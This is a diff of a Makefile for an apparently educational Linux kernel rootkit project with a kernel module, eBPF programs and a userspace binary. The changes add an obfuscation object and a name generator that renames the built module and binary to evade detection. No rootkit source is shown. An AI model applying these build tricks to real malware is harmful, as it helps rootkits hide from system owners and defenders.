@@ -1,6 +1,16 @@
-obj-m += rootkit.o
+obj-m += rk.o
+rk-objs := rootkit.o obfs.o
 
-KDIR := /home/ash/Downloads/kernel/exam/rootkit/build-sys-linux-6.19.9/
+# Kernel version: use .target_kver if present, else running kernel
+KVER ?= $(shell cat .target_kver 2>/dev/null || uname -r)
+
+# KDIR: prefer local build-sys-linux-<KVER> if present (exam env), else /lib/modules
+BUILDSYS := $(wildcard $(PWD)/../build-sys-linux-$(KVER))
+ifeq ($(BUILDSYS),)
+KDIR := /lib/modules/$(KVER)/build
+else
+KDIR := $(BUILDSYS)
+endif
 
 PWD  := $(shell pwd)
 
@@ -13,11 +23,26 @@ BPF_OBJS   := $(BPF_SRCS:.bpf.c=.bpf.o)
 
 all: modules userspace ebpf
 
-modules:
+gen_name:
+	gcc -Wall -Wextra -o gen_name gen_name.c
+
+_build_module:
+	@echo "[*] build module pour kernel $(KVER)"
 	make -C $(KDIR) M=$(PWD) modules
 
-userspace:
-	gcc -Wall -Wextra -I$(PWD) -o rootkit_malware core.c
+_rename: _build_module
+	$(eval RK_NAME := $(shell ./gen_name))
+	mv rk.ko $(RK_NAME).ko
+	echo "$(RK_NAME)" > .rk_name
+	@echo "[+] module renommé : $(RK_NAME).ko"
+
+modules: gen_name _build_module _rename
+
+userspace: gen_name
+	$(eval BIN_NAME := $(shell ./gen_name))
+	gcc -Wall -Wextra -I$(PWD) -o $(BIN_NAME) core.c
+	echo "$(BIN_NAME)" > .rk_bin_name
+	@echo "[+] binaire renommé : $(BIN_NAME)"
 
 ebpf: $(BPF_OBJS) ebpf_loader
 
@@ -29,7 +54,8 @@ ebpf_loader:
 
 clean:
 	make -C $(KDIR) M=$(PWD) clean
-	rm -f rootkit_malware
+	rm -f rootkit_malware $(shell cat .rk_bin_name 2>/dev/null)
+	rm -f .rk_bin_name .rk_name gen_name
 	rm -f $(BPF_DIR)/*.bpf.o $(BPF_DIR)/rk_ebpf_loader
 
-.PHONY: all modules userspace ebpf ebpf_loader clean
+.PHONY: all modules gen_name _build_module _rename userspace ebpf ebpf_loader dropper clean
